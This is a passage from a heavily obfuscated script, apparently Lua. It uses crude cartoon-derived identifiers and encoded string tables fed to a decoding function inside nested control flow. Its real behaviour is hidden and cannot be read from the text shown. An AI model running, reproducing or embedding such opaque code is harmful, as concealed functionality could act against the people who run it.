FartButtHead"," ButtHeadDumb HoleBunghole BeavisGringo BeavisChode DillHole DillWuss"})end;if AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787819,6,1919787817,7,1919787924,1919787828,8,1919787826,9,1919787923,1919787792,1,1919787839,10,1919787920,1919787801,2,1919787801,2,1919787790},{" BungholeCool BeavisDammit BungholeMunch CornholioDiarrhea DillButtHead"," DillBeavis DillScore CornholioTp KnockerCrap CornholioFart"," HoleCool CornholioPlop DillCool CornholioSucks FartTp"," DillFire ButtHeadNads HoleNads ButtHeadWipe BeavisButtHead"," ButtHeadBoing CornholioDill CornholioKnocker HoleHeh BeavisGringo BungholeDill CornholioDill"," HoleSchlong CornholioKnocker FartCrap ButtHeadMunch"," FartFart HoleSchlong CornholioWhoa KnockerPlop"," BungholeWuss KnockerDiarrhea KnockerScore HoleWhoa DillSucks"," HoleKnocker FartGringo BeavisKnocker BungholeTurd CornholioTurd"," ButtHeadFart HoleTurd KnockerDammit KnockerSucks CornholioDumb BungholeCrap CornholioWuss"},Dillhole2,not Gringo2[14418])then Gringo2[14418]=1;if AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787849,1919787788,1,1919787819,5,1919787938,1919787799,1,1919787828,6,1919787961,1919787922,1919787832},{" FartDiarrhea DillAss DillCrap KnockerSucks HoleWhoa"," CornholioCornholio CornholioTurd FartBunghole DillButtHead FartCool"," CornholioDiarrhea HoleCool BungholeGringo HoleHole ButtHeadButtHead"," BungholeFire KnockerNads HoleWhoa ButtHeadHole ButtHeadChode"," ButtHeadBunghole BungholeTurd"," BungholeHole KnockerBeavis"},Diarrhea1)then local TP2=80027;local LakeTiticaca2={}local Nads2=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787844,1919787822,4,1919787820,5,1919787913,1919787819,6,1919787921,7,1919787831,8,1919787966,1919787952,0,1919787832},{" ButtHeadHeh DillCornholio BungholeCrap HoleWuss ButtHeadCool DillPlop BeavisCrap"," HoleBunghole DillDiarrhea KnockerDumb KnockerScore FartHole"," BungholeCrap BungholeTurd FartGringo ButtHeadHuh BungholeCool"," BungholeCool BeavisDammit FartDumb BungholeDiarrhea HoleKnocker"," ButtHeadCornholio FartScore KnockerSchlong DillFart CornholioSucks"," FartPlop DillKnocker CornholioCrap HoleButtHead ButtHeadButt FartTp HoleTurd"," DillNads BeavisDill HoleTurd"," BungholeMunch ButtHeadDill BeavisButtHead BeavisScore DillWuss HoleHeh"})while true do if AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787924,5,1919787785,16,1919787920,6,1919787830,7,1919787967,1919787959,0,1919787794,1,1919787850,1919787838,8,1919787933,1919787837,9,1919787926,1919787824},{" BeavisAss BungholeHeh BungholeDumb ButtHeadWipe HoleDiarrhea"," HoleKnocker FartGringo BeavisKnocker KnockerSucks CornholioCool"," BungholeBunghole FartSchlong KnockerFire FartDill DillBoing HoleSchlong KnockerButtHead"," BeavisBunghole BeavisHeh FartWuss BeavisTp DillWipe BungholeWhoa"," HoleTurd BeavisMunch HoleDiarrhea HoleTurd KnockerDiarrhea"," HoleBoing BeavisScore BeavisSchlong"," HoleFart DillWipe ButtHeadDill DillBunghole HoleWipe ButtHeadCool"," CornholioPlop DillBeavis KnockerScore HoleButtHead ButtHeadSchlong",false},Nads2)then AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787906,1919787822,4,1919787820,5,1919787913,1919787819,6,1919787921,7,1919787831,8,1919787966,1919787952,0,1919787832},{" ButtHeadAss HoleWuss ButtHeadDumb BeavisFire BungholeKnocker HoleBunghole FartPlop"," CornholioSchlong KnockerHuh HoleChode BeavisAss DillDiarrhea"," CornholioTp KnockerBoing FartDiarrhea ButtHeadBunghole BeavisWipe"," HoleDammit FartNads BungholeDammit CornholioButt KnockerHeh"," FartScore BungholeHole ButtHeadDiarrhea HoleSucks HoleButtHead"," DillGringo CornholioPlop CornholioMunch BeavisDammit BeavisTp FartPlop HoleHuh"," FartButtHead BeavisTurd BeavisGringo FartButtHead ButtHeadFire"," FartPlop DillGringo ButtHeadKnocker KnockerBoing BungholeCornholio"})Nads2=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787820,5,1919787913,1919787923,6,1919787817,7,1919787964,1919787958,0,1919787834},{" CornholioScore HoleMunch KnockerBunghole DillNads HoleKnocker"," HoleDill KnockerDill BungholeBeavis HoleBeavis DillDiarrhea"," BungholeDammit KnockerButt KnockerButt BeavisCool FartSucks DillDammit BungholeDumb"," ButtHeadKnocker DillCrap BeavisAss DillAss KnockerCool"," FartScore BungholeHole ButtHeadHeh DillWuss ButtHeadWhoa"," KnockerTurd DillMunch FartWuss"," KnockerSucks HoleButt FartDammit BeavisDammit KnockerChode BeavisTurd"})end;if AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787914,1919787830,7,1919787828,8,1919787826,9,1919787861,1919787792,1,1919787839,10,1919787920,1919787801,2,1919787801,2,1919787790},{" KnockerFire HoleBunghole FartWipe CornholioHuh KnockerGringo"," HoleSchlong CornholioKnocker KnockerHole ButtHeadMunch KnockerSchlong"," ButtHeadHole BeavisWuss HoleTurd DillNads BungholeCool"," ButtHeadNads BungholeAss HoleDill KnockerHeh BeavisTurd"," ButtHeadSucks ButtHeadKnocker BeavisWuss FartScore BeavisDiarrhea"," BungholeHuh DillGringo ButtHeadWuss KnockerChode BungholeCool"," DillNads BungholePlop BeavisBoing KnockerCrap FartWhoa CornholioSucks"," DillHuh CornholioCrap KnockerHeh BungholeCool FartFart"," CornholioHuh KnockerSucks KnockerBunghole BungholeDiarrhea HoleKnocker"," BeavisSucks DillCornholio BungholeKnocker BeavisPlop BeavisGringo DillMunch HoleCornholio BungholeScore"},TP2,not LakeTiticaca2[111193])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787844,1919787791,1,1919787820,4,1919787911,1919787784,2,1919787784,2,1919787839},{" HoleButtHead FartFire BeavisDammit BeavisCornholio BeavisTurd HoleAss"," BeavisGringo KnockerChode CornholioBoing FartScore BeavisDiarrhea"," BungholeNads KnockerWhoa BungholeDammit CornholioSchlong BeavisWhoa"," DillCrap KnockerGringo BungholeWuss KnockerFire CornholioButtHead ButtHeadMunch KnockerHeh"},TP2,not LakeTiticaca2[80027])then LakeTiticaca2[80027]=1;FireFire1=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787906,1919787822,4,1919787820,5,1919787913,1919787819,6,1919787817,7,1919787924,1919787828,8,1919787826,9,1919787861,1919787913,10,1919787839,11,1919787958,1919787834,12,1919787832,13,1919787908,2,1919787788},{" BungholeCrap HoleDill BungholeSchlong KnockerBoing KnockerAss DillHeh ButtHeadScore"," BeavisBoing BungholeHuh HoleNads DillSchlong KnockerDill"," HoleButtHead CornholioDill FartDill FartMunch HoleTp"," CornholioCool BeavisScore FartButt HoleDill BeavisCornholio"," BeavisWhoa FartWuss DillHeh DillPlop DillDammit"," DillHuh CornholioCrap BungholeSchlong FartWhoa ButtHeadTp"," CornholioBunghole FartCornholio KnockerWuss CornholioCrap BeavisGringo"," BungholeHeh BungholeDiarrhea BeavisBeavis KnockerHeh CornholioHuh"," FartDammit FartCool KnockerBoing DillDumb FartDill"," BeavisAss KnockerNads KnockerGringo BungholePlop HoleFire CornholioDill"," ButtHeadBeavis BeavisWuss BeavisCrap DillSchlong BungholeGringo"," BeavisTurd KnockerTurd DillAss DillNads DillButtHead ButtHeadBeavis KnockerHuh"," DillScore BeavisGringo ButtHeadSchlong ButtHeadChode DillFire KnockerFart BungholeKnocker"})break elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787914,1919787799,1,1919787828,7,1919787935,1919787792,2,1919787792,2,1919787831},{" HoleDammit FartNads HoleWipe CornholioButt ButtHeadKnocker"," DillHole DillSchlong KnockerKnocker BungholeBeavis BungholePlop"," FartSchlong DillNads KnockerSucks FartCornholio ButtHeadGringo"," DillWuss HoleDiarrhea HoleWuss FartDill FartGringo"," ButtHeadKnocker DillCrap DillFire DillDiarrhea CornholioDiarrhea"," BeavisMunch FartDiarrhea KnockerHeh CornholioHuh CornholioBunghole"," CornholioBoing FartButtHead FartHeh FartDammit CornholioButt BeavisWhoa BeavisTurd"},TP2,not LakeTiticaca2[17266])then end end else local Score2=14854;local Boing2={}local Schlong2=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787809,4,1919787916,1919787924,5,1919787818,6,1919787939,1919787947,0,1919787839},{" KnockerCornholio FartHeh BeavisDammit KnockerChode ButtHeadSchlong CornholioHuh HoleDiarrhea"," DillBeavis FartCrap DillAss BeavisSchlong HoleNads ButtHeadDammit DillWhoa"," BungholeHuh DillGringo ButtHeadWuss BeavisCornholio CornholioFire"," BeavisNads DillPlop BungholeFart DillWuss BungholeNads"," BeavisMunch FartHole ButtHeadPlop"," KnockerSucks HoleButt FartDammit BeavisDammit KnockerChode BeavisTurd"})while true do if AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787844,1919787822,4,1919787820,5,1919787855,1919787819,6,1919787921,7,1919787796,16,1919787917,8,1919787827,9,1919787962,1919787964,0,1919787805,1,1919787841,1919787835,10,1919787928,1919787782,11,1919787945,1919787789},{" KnockerButtHead DillKnocker BeavisBoing HoleTp BungholeCool KnockerBeavis"," FartSucks HoleDumb BeavisSucks FartTp BungholeTp"," BungholeCornholio KnockerPlop BeavisWhoa KnockerKnocker KnockerBeavis"," HoleCornholio BeavisSucks CornholioPlop BungholeSucks BungholeDammit"," FartDill KnockerWipe FartBeavis ButtHeadTp CornholioTp"," ButtHeadTurd CornholioScore DillDumb HoleBeavis BeavisCornholio BungholeButt BeavisDumb"," ButtHeadHuh FartTurd BeavisScore ButtHeadHuh BeavisPlop"," ButtHeadDumb KnockerTp ButtHeadDammit"," BeavisCornholio CornholioChode DillDiarrhea FartBunghole FartDiarrhea ButtHeadWipe"," DillCool ButtHeadButtHead KnockerWhoa CornholioWhoa ButtHeadFart",false},Schlong2)then AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787852,1919787918,7,1919787828,8,1919787961,1919787953,0,1919787833},{" FartHole ButtHeadFire FartFire FartSucks KnockerChode"," ButtHeadFire BungholeBeavis CornholioDammit HoleDumb BungholeBunghole"," FartDill KnockerWipe DillCool KnockerGringo"," FartHole ButtHeadFire FartButt ButtHeadWuss"," CornholioBunghole FartCornholio CornholioWhoa BeavisNads CornholioNads"," ButtHeadAss FartHeh CornholioSucks BeavisButtHead ButtHeadFire"," BeavisMunch DillCornholio BeavisCrap BeavisMunch BeavisAss"," ButtHeadSucks ButtHeadHuh HoleHeh BungholeChode BungholeGringo"})Schlong2=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787809,4,1919787850,1919787924,5,1919787818,6,1919787939,1919787947,0,1919787839},{" KnockerBunghole KnockerGringo BeavisDill CornholioGringo BungholeAss HoleKnocker KnockerMunch"," KnockerTurd BeavisWipe ButtHeadFire BeavisWuss FartGringo BeavisTurd HoleChode"," CornholioTurd FartDumb FartButt CornholioSchlong BeavisFart"," FartNads DillHuh ButtHeadDill BeavisChode"," BeavisKnocker ButtHeadWipe BungholeGringo"," BeavisCrap KnockerWhoa DillBeavis FartBeavis KnockerMunch BeavisChode"})end;if AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787820,5,1919787818,6,1919787816,7,1919787859,1919787798,1,1919787829,8,1919787934,1919787795,2,1919787807,2,1919787828},{" CornholioNads DillDammit BeavisTp CornholioCool ButtHeadHole"," FartSucks HoleDumb CornholioCornholio DillFire BungholeHole"," HoleDumb CornholioCrap BungholeWuss ButtHeadNads DillHuh CornholioButt KnockerHeh"," DillHeh BeavisCornholio FartFart FartButt BungholeHole CornholioHole BungholeDumb"," KnockerDumb BungholeWuss DillMunch ButtHeadChode CornholioButtHead FartBunghole BeavisCrap"," BungholeBoing BeavisSchlong HoleSucks BeavisWhoa CornholioScore"," BeavisDiarrhea BungholeKnocker DillWuss HoleWhoa CornholioScore"," FartSchlong DillNads KnockerSucks HoleWhoa BungholeHuh BungholeButtHead KnockerHole"},Score2,not Boing2[41338])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787777,1,1919787822,3,1919787905,1919787790,2,1919787786,2,1919787809},{" FartTp ButtHeadGringo HoleNads ButtHeadWipe BungholeGringo"," ButtHeadBoing ButtHeadMunch BungholeFart CornholioFart CornholioDumb"," BeavisTp ButtHeadDumb HoleWuss BeavisHole DillPlop DillNads FartBeavis"},Score2,not Boing2[70455])then elseif AlmightyBunghole({1919787815,1,1919787780,1,1919787811,2,1919787916,1919787789,2,1919787789,2,1919787810},{" HoleMunch BungholeDill FartHeh FartFire BungholeNads KnockerButt"," ButtHeadNads BungholeAss FartSucks ButtHeadKnocker BeavisTurd HoleChode BeavisBoing"},Score2,not Boing2[14854])then Boing2[14854]=1;FireFire1=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787819,6,1919787817,7,1919787831,8,1919787926,1919787914,9,1919787824,10,1919787957,1919787839,11,1919787837,11,1919787961,2,1919787825},{" FartHeh HoleKnocker FartCornholio ButtHeadSchlong"," DillFart KnockerScore BeavisScore BeavisSchlong HoleBunghole"," FartMunch DillTurd BeavisDumb BeavisBoing CornholioGringo"," DillDill BungholeTp FartDammit FartKnocker CornholioWipe"," ButtHeadButt HoleSucks DillBeavis BungholeButt BeavisNads ButtHeadDumb KnockerDammit"," ButtHeadWipe BeavisWuss HoleHeh BeavisDiarrhea BungholeBoing KnockerDumb HoleWipe"," BungholeScore FartAss BungholeDill DillBoing ButtHeadWuss"," BungholeFart CornholioBunghole BungholeHeh CornholioWuss DillBoing"," BungholeBeavis DillBeavis BeavisCrap KnockerAss ButtHeadSucks BeavisChode"," KnockerTp CornholioGringo ButtHeadHuh HoleKnocker DillSchlong"," DillChode KnockerCool HolePlop CornholioHole KnockerKnocker HoleCrap FartButtHead"})break elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787778,1,1919787809,3,1919787906,1919787791,2,1919787787,2,1919787808},{" BungholeFart ButtHeadWipe HoleHuh DillScore BeavisTp BeavisCornholio BungholeCool"," DillCool CornholioButt ButtHeadAss HoleNads ButtHeadFart FartTp KnockerCrap"," FartButtHead ButtHeadPlop FartBeavis FartCool HoleFire DillCrap HoleScore"},Score2,not Boing2[97627])then end end end;break elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787906,1919787822,4,1919787820,5,1919787855,1919787819,6,1919787784,1,1919787831,7,1919787928,1919787793,2,1919787793,2,1919787830},{" KnockerFart FartChode HoleBeavis KnockerCrap BungholeAss DillGringo BungholeHeh"," FartHole ButtHeadFire FartFire ButtHeadMunch CornholioHole"," CornholioSchlong KnockerHuh KnockerAss HoleBeavis BungholeMunch"," BeavisHeh BungholeButt ButtHeadBoing KnockerWipe BeavisHuh"," DillWipe KnockerFart DillTp BeavisDammit FartCornholio"," KnockerButt BeavisTp ButtHeadTurd KnockerHeh CornholioBunghole DillHeh"," BeavisButtHead BeavisTurd ButtHeadBoing BungholeWhoa BungholeSucks HoleWipe KnockerScore"},Dillhole2,not Gringo2[93126])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787852,1919787799,1,1919787828,7,1919787935,1919787792,2,1919787792,2,1919787831},{" KnockerMunch KnockerSchlong ButtHeadCool DillCornholio ButtHeadPlop"," BungholeDill ButtHeadBoing ButtHeadWhoa ButtHeadButt ButtHeadTp"," CornholioTp KnockerBoing ButtHeadFart CornholioPlop KnockerHuh"," HoleNads HoleDill CornholioGringo KnockerTurd DillWipe"," BungholeDammit HoleGringo ButtHeadSchlong DillHuh CornholioButtHead"," FartWhoa HoleSucks KnockerCrap BeavisWuss FartDiarrhea"," BeavisDiarrhea BungholeKnocker FartKnocker HoleWhoa KnockerKnocker DillDumb BeavisAss"},Dillhole2,not Gringo2[28685])then end end elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787906,1919787791,1,1919787924,4,1919787818,5,1919787939,1919787817,6,1919787831,7,1919787959,2,1919787934,1919787832},{" DillDumb DillPlop CornholioFire ButtHeadChode FartCool ButtHeadAss DillDammit"," KnockerChode ButtHeadDiarrhea FartAss BungholeMunch CornholioDiarrhea"," CornholioBoing FartButtHead FartHeh HoleWipe KnockerScore"," HoleFart FartScore FartSchlong ButtHeadDumb BungholeSucks FartButt"," BeavisTurd DillDiarrhea HoleWhoa DillCool CornholioCornholio"," FartDiarrhea DillAss KnockerDammit ButtHeadCool ButtHeadWhoa ButtHeadGringo DillHuh"," CornholioHeh DillDumb CornholioDammit KnockerDill KnockerDumb HoleSucks ButtHeadWhoa"},FireFire1)then local Turd,Chode2,Hole;local Buttmunch2=68020;local Assmunch2={}local Dumbass2=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787923,6,1919787817,7,1919787964,1919787958,0,1919787834},{" HoleButt ButtHeadFart BungholeSchlong BungholeButt KnockerBeavis"," BeavisWuss BeavisAss BeavisButt KnockerDammit FartKnocker"," HoleDiarrhea ButtHeadSchlong HoleKnocker KnockerMunch BungholeFire"," FartWipe BungholeFart BeavisDill ButtHeadCrap KnockerCool"," BungholeKnocker BeavisDumb ButtHeadCrap FartBoing KnockerSucks CornholioDammit"," FartFire ButtHeadPlop BungholeDill"," HoleDammit HoleWipe DillWuss KnockerCornholio CornholioHuh DillDumb"})while true do if AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787929,4,1919787788,16,1919787925,5,1919787819,6,1919787938,1919787956,0,1919787797,1,1919787849,1919787827,7,1919787920,1919787838,8,1919787921,1919787829},{" KnockerDumb KnockerKnocker CornholioWuss DillKnocker ButtHeadScore BeavisWhoa FartWhoa"," KnockerFire CornholioHole KnockerButtHead KnockerBeavis BeavisFire ButtHeadAss"," ButtHeadPlop DillBoing HoleDammit CornholioHuh HoleButt KnockerGringo CornholioBeavis"," BeavisMunch DillCornholio BeavisCrap BeavisMunch BeavisAss"," BeavisTp DillWhoa ButtHeadDiarrhea"," HoleBeavis KnockerTp CornholioBunghole BeavisBoing CornholioDill DillGringo"," DillBunghole ButtHeadButt CornholioTurd ButtHeadGringo HoleWuss",false},Dumbass2)then AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787820,5,1919787855,1919787819,6,1919787817,7,1919787924,1919787916,8,1919787826,9,1919787963,1919787955,0,1919787831},{" HoleCrap KnockerCornholio BungholeKnocker HoleKnocker ButtHeadBunghole"," HoleDumb FartWhoa HoleHeh ButtHeadGringo HoleWuss"," KnockerGringo HoleTp BeavisCrap FartDiarrhea DillBunghole BeavisButt"," KnockerTp CornholioSchlong BeavisKnocker BeavisWuss BungholeNads"," KnockerCool FartTurd ButtHeadDumb BungholeFart KnockerTurd"," CornholioAss KnockerBunghole ButtHeadHeh KnockerScore FartWipe"," HoleDill KnockerDill BeavisCool HoleBeavis KnockerWhoa"," BungholeTp BeavisCool BeavisWipe BungholeTp DillGringo"," BeavisTp DillMunch FartCrap FartSucks FartCornholio"})Dumbass2=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787819,6,1919787817,7,1919787831,8,1919787856,1919787914,9,1919787824,10,1919787957,1919787965,0,1919787829},{" BungholeBunghole BeavisDumb FartPlop ButtHeadCornholio CornholioButtHead"," BungholeMunch BungholeButtHead ButtHeadDill HoleHuh"," DillGringo BungholePlop BeavisButt ButtHeadDiarrhea BeavisBeavis"," DillFart KnockerScore FartNads BungholeDiarrhea HoleBunghole"," HoleHuh CornholioCrap CornholioTurd CornholioWuss HoleWipe KnockerSucks DillBeavis"," DillButt ButtHeadWuss CornholioHole KnockerNads BungholeChode HoleFire"," BungholeHuh DillGringo HoleTurd KnockerSchlong FartWhoa"," ButtHeadScore BeavisHuh ButtHeadTp FartButtHead BungholeTp"," FartHeh BungholeNads BungholeWuss"," DillTurd HoleSchlong BungholeBoing BungholeDill BeavisAss ButtHeadMunch"})end;if AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787791,1,1919787820,4,1919787911,1919787784,2,1919787784,2,1919787839},{" CornholioDill KnockerBeavis BeavisDiarrhea CornholioMunch DillBoing"," ButtHeadWuss BeavisButt CornholioCornholio DillFire BungholeMunch"," HoleDumb KnockerPlop ButtHeadPlop KnockerDill BeavisMunch HoleSucks BeavisFart"," FartBeavis FartKnocker FartDumb BungholeAss DillDill BeavisDiarrhea BungholeCornholio"},Buttmunch2,not Assmunch2[68020])then Assmunch2[68020]=1;Diarrhea1.k=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787786,1,1919787817,6,1919787964,1919787916,7,1919787826,8,1919787963,1919787825,9,1919787839,10,1919787967,2,1919787841,1919787801,2,1919787904,1919787791},{" BeavisHuh HoleAss FartHole BungholeHuh BungholeButtHead"," BeavisMunch FartDiarrhea KnockerChode ButtHeadButt HoleCrap"," FartHuh HoleBeavis HoleDumb FartButt CornholioButt"," KnockerDammit FartChode DillChode ButtHeadCornholio CornholioButtHead"," BeavisHeh ButtHeadFart ButtHeadDammit HoleDumb CornholioHeh HoleWipe HoleHeh"," DillBunghole HoleBoing"," ButtHeadHeh ButtHeadHole HoleButt ButtHeadDiarrhea FartCrap ButtHeadAss"," ButtHeadWipe HoleScore BungholeDumb CornholioDammit DillMunch"," DillSucks BungholeScore KnockerBunghole CornholioDiarrhea HoleNads ButtHeadBeavis BeavisChode"," KnockerNads CornholioButt BeavisScore HoleScore DillWipe KnockerWipe CornholioMunch"},Diarrhea1,Hole1)Buttmunch2=AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787786,1,1919787817,6,1919787858,1919787828,7,1919787956,1919787835},{" FartMunch DillTurd KnockerBeavis BeavisFire BungholeMunch"," FartFire CornholioDammit ButtHeadSchlong BeavisSucks FartAss"," CornholioAss KnockerBunghole KnockerDumb ButtHeadCool FartWipe"," ButtHeadBoing ButtHeadMunch HoleHole CornholioBoing CornholioCool"," KnockerBeavis KnockerWhoa DillFart FartCool BungholeGringo FartNads"," CornholioBunghole FartCornholio BungholeAss CornholioCrap BungholeChode DillWhoa ButtHeadHeh"," HoleFire DillCool HoleDammit FartPlop BungholeFire KnockerHole ButtHeadTurd HoleButtHead"},Buttmunch2)elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787820,5,1919787855,1919787819,6,1919787817,7,1919787924,1919787797,1,1919787826,8,1919787933,1919787794,2,1919787806,2,1919787829},{" KnockerTp CornholioSchlong CornholioGringo BungholeTurd DillDill"," BeavisNads DillPlop DillTp KnockerSucks CornholioDumb"," BungholeBoing ButtHeadButtHead CornholioHole BungholeWuss DillHuh FartButtHead"," FartWuss ButtHeadTp CornholioNads CornholioWuss KnockerHole"," HoleTp DillKnocker HoleFire BeavisKnocker HoleMunch"," BeavisHole DillChode DillButt HoleGringo BeavisFire"," KnockerNads CornholioButt KnockerCrap HoleScore FartDiarrhea"," ButtHeadButtHead BeavisFire BungholeCornholio DillKnocker HoleDill ButtHeadHuh FartBeavis"},Buttmunch2,not Assmunch2[77721])then Assmunch2[77721]=1;Diarrhea1.i=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787819,6,1919787817,7,1919787831,8,1919787926,1919787795,1,1919787824,9,1919787957,1919787911,10,1919787837,11,1919787952,1919787832,12,1919787782,13,1919787910,2,1919787879,1919787787},{" KnockerHeh KnockerDammit BeavisAss KnockerBunghole HoleTp"," ButtHeadChode DillDill ButtHeadHuh DillButt ButtHeadBeavis"," ButtHeadKnocker DillCrap BungholePlop ButtHeadAss KnockerWuss"," KnockerKnocker CornholioBoing DillAss HoleTp DillButt"," FartCrap ButtHeadNads HoleWuss CornholioButtHead KnockerWhoa BungholeDiarrhea ButtHeadBoing"," BeavisDumb ButtHeadCrap KnockerTp HoleBunghole CornholioChode FartHeh DillWuss"," FartFire CornholioDammit CornholioHuh CornholioSucks CornholioChode"," BungholeCool BeavisDammit KnockerWhoa BeavisBunghole HoleBoing"," CornholioDumb DillHole"," FartButt CornholioScore ButtHeadCornholio DillScore FartButtHead FartNads"," FartSchlong ButtHeadButtHead DillButtHead CornholioNads HoleHuh"," KnockerWuss FartFire BungholeGringo FartWuss BeavisWuss FartScore ButtHeadPlop"," HoleHeh ButtHeadCrap HoleWipe CornholioButt HoleSchlong ButtHeadSchlong CornholioSucks"},Diarrhea1)Buttmunch2=AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787914,1919787830,7,1919787828,8,1919787795,1,1919787824,9,1919787867,1919787839,10,1919787963,1919787826},{" BungholeButtHead DillWipe BeavisCornholio ButtHeadButt FartChode"," BeavisWhoa FartWuss BeavisHole DillPlop DillDammit"," ButtHeadHole BeavisWuss CornholioSchlong KnockerButtHead CornholioFire"," FartHeh HoleKnocker HoleWhoa ButtHeadSchlong ButtHeadTp"," FartPlop CornholioDiarrhea BeavisBeavis KnockerHeh BungholeButt"," FartDiarrhea DillAss HoleHole KnockerScore KnockerCornholio"," BungholeCornholio FartScore CornholioHuh BungholeCornholio KnockerAss KnockerBunghole CornholioDiarrhea"," BeavisBunghole CornholioPlop BungholeBunghole BeavisDammit ButtHeadButtHead KnockerWipe KnockerDill HoleCool"," BeavisSucks DillCornholio ButtHeadHuh HoleKnocker ButtHeadSucks ButtHeadDumb CornholioKnocker"," BungholeKnocker DillBoing DillBunghole CornholioDill BeavisWuss CornholioDumb FartPlop FartHeh"},Buttmunch2)elseif AlmightyBunghole({1919787815,1,1919787780,1,1919787811,2,1919787916,1919787789,2,1919787789,2,1919787810},{" BungholeNads HoleCornholio HoleWipe HolePlop BungholeBoing BeavisTurd BeavisSucks"," HoleCornholio BeavisSucks KnockerMunch BeavisButt ButtHeadHeh HolePlop HoleSchlong"},Buttmunch2,not Assmunch2[78737])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787819,6,1919787852,1919787830,7,1919787828,8,1919787826,9,1919787923,1919787792,1,1919787839,10,1919787920,1919787801,2,1919787801,2,1919787790},{" HoleCrap KnockerCornholio FartBunghole ButtHeadBoing BeavisGringo"," HoleDill KnockerDill KnockerAss CornholioChode ButtHeadCrap"," DillScore BeavisGringo BeavisTurd BeavisSucks FartCrap"," FartButt ButtHeadDill BungholeButt HoleCrap CornholioBeavis"," CornholioBunghole FartCornholio BungholeDiarrhea CornholioCrap CornholioPlop"," CornholioHole DillTp FartButtHead BungholeHole HoleTp"," CornholioButtHead KnockerButt CornholioHuh HoleCool HoleDiarrhea BeavisSchlong HoleNads"," HoleBunghole DillDiarrhea FartDammit FartKnocker CornholioWipe"," HoleButt ButtHeadFart CornholioHole BungholeCool HoleCrap"," ButtHeadSucks ButtHeadKnocker FartHuh HoleHeh BeavisDiarrhea BungholeDill KnockerHole"},Buttmunch2,not Assmunch2[32520])then Assmunch2[32520]=1;Chode2=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787809,4,1919787916,1919787924,5,1919787818,6,1919787939,1919787784,1,1919787831,7,1919787966,1919787914,8,1919787824,9,1919787957,1919787839,10,1919787837,11,1919787961,2,1919787950,1919787908,1,1919787964,8,1919787778,9,1919787915,1919787777,12,1919787791,13,1919787919,2,1919787917,1919787776},{" HoleFart CornholioAss ButtHeadSucks CornholioTp ButtHeadFire CornholioBoing"," FartMunch CornholioCornholio BeavisHeh ButtHeadDumb KnockerSchlong FartBoing CornholioDammit"," DillGringo BungholePlop DillWhoa BungholeDammit ButtHeadCool"," DillDammit FartButt BungholeGringo BeavisKnocker FartBoing"," CornholioCornholio BeavisFart BeavisPlop BeavisSucks ButtHeadDumb"," CornholioDammit HoleScore DillWipe CornholioPlop BungholeFire ButtHeadDiarrhea"," CornholioFire DillPlop"," KnockerPlop HoleHole BungholeTurd HoleKnocker KnockerCornholio ButtHeadGringo"," BungholeFart ButtHeadNads HoleFart BungholeBunghole ButtHeadButtHead"," BeavisDammit BeavisButtHead ButtHeadCornholio BeavisDill DillPlop KnockerChode HoleAss CornholioBunghole"," DillBoing FartSchlong DillCool BeavisCool CornholioChode BungholeHole BeavisSchlong"," CornholioButt DillMunch BeavisCool DillFire KnockerFart KnockerWuss"," DillNads BungholeDammit CornholioTp ButtHeadFire BungholeTurd DillDill"},Diarrhea1)Buttmunch2=AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787817,7,1919787858,1919787828,8,1919787795,1,1919787824,9,1919787867,1919787839,10,1919787963,1919787826},{" HoleCornholio BeavisSucks BeavisDiarrhea BungholeFire BungholeBunghole"," ButtHeadMunch BungholeFire FartFart BeavisBoing BungholeWipe"," FartCool FartWipe BungholeTurd FartDiarrhea"," KnockerKnocker CornholioBoing FartMunch KnockerChode"," KnockerCornholio CornholioMunch HoleDill KnockerCornholio ButtHeadGringo BungholeBeavis CornholioBunghole"," BeavisBeavis 